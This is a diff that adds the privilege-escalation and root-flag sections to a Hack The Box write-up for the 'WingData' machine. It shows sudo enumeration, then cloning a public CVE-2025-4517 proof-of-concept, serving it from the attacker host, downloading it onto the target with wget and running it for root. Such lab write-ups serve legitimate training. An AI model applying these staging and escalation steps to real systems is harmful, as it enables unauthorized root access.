@@ -8,7 +8,7 @@ Author: Trushit Oza
 - Platform: Hack The Box
 - Primary Hostname: wingdata.htb
 - Target IP: 10.129.244.106
-- Objective: Gain initial access, enumerate local data, and capture user flag
+- Objective: Gain initial access, enumerate local data, and capture user and root flag
 
 ## 1. Reconnaissance
 
@@ -142,6 +142,88 @@ cat ~/user.txt
 
 ![User flag retrieval](userflag.png)
 
+## 8. Privilege Escalation
+
+### Check sudo permissions for current user
+
+```bash
+sudo -l
+```
+
+Output showed that user `wacky` can run a Python-based backup restore script as root without a password:
+
+```text
+Matching Defaults entries for wacky on wingdata:
+	env_reset, mail_badpass,
+	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+	use_pty
+
+User wacky may run the following commands on wingdata:
+	(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+```
+
+This indicates the `wacky` user can execute the restore logic as root through:
+
+```text
+/opt/backup_clients/restore_backup_clients.py
+```
+
+![Sudo permission enumeration](sudo-permision.png)
+
+### Review restore script behavior
+
+```bash
+cat /opt/backup_clients/restore_backup_clients.py
+```
+
+After identifying that the backup restore flow runs with root privileges, the next step was to use a public exploit for the vulnerable restore functionality.
+
+![Restore script review - part 1](viewScript1.png)
+![Restore script review - part 2](viewScript2.png)
+
+### Use public PoC for CVE-2025-4517
+
+From the attacker machine:
+
+```bash
+git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
+cd CVE-2025-4517-POC-HTB-WingData
+ls
+python3 -m http.server 80
+```
+
+![Public PoC repository](github-repo-vuln-backup-restore-functionality.png)
+![Running local HTTP server](runing-http-server.png)
+
+From the target machine:
+
+```bash
+cd /tmp
+wget http://10.10.17.208:80/CVE-2025-4517-POC.py
+```
+
+`/tmp` is writable and commonly used for temporary file staging.
+
+![PoC download on target](Downloading-exploit.png)
+
+## 9. Root Access and Root Flag
+
+Execute the downloaded PoC on the target:
+
+```bash
+python3 CVE-2025-4517-POC.py
+```
+
+After successful execution, root shell access is obtained.
+
+```bash
+cd /root
+cat root.txt
+```
+
+![PoC execution for root](runing-script-for-root.png)
+![Root flag retrieval](root-flag.png)
+
 ## Evidence Checklist
 
 - [x] Recon and service discovery
@@ -151,3 +233,6 @@ cat ~/user.txt
 - [x] Local credential discovery
 - [x] Password recovery
 - [x] SSH access and user flag retrieval
+- [x] Sudo misconfiguration identification
+- [x] Privilege escalation to root
+- [x] Root flag retrieval
